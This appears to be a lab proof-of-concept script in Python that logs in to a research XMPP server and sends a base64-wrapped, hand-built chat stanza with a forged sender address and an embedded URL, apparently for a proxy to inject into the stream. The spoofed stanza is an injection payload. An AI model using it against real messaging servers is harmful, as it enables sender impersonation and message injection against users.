import xmpp
import base64
import uuid

jabberid = "xclient@xmpp-research.local"
password = "password"
receiver = "admin@xmpp-research-proxy.lan"


def gen_message(body):
    a = b'REPLACEME' + base64.b64encode(body) + b'REPLACEME'
    return a.decode('ascii')


def make_message():
    message_uuid = str(uuid.uuid4())
    message = 'https://google.com/'
    receiver_real = 'uwu@localhost/{google}'
    body = f'<message type="chat" to="{receiver}" from="{receiver_real}" id="{message_uuid}"><x xmlns="jabber:x:oob"><url>{message}</url></x><body>{message}</body></message>'
    #body = a
    print(body)
    return body


def main():
    jid = xmpp.protocol.JID(jabberid)
    connection = xmpp.Client(server=jid.getDomain(), debug=True)
    connection.connect()
    connection.auth(
        user=jid.getNode(),
        password=password,
        resource=jid.getResource()
    )

    message = gen_message(make_message().encode('utf-8'))

    connection.send(xmpp.protocol.Message(to=receiver, body=message))


if __name__ == "__main__":
    main()
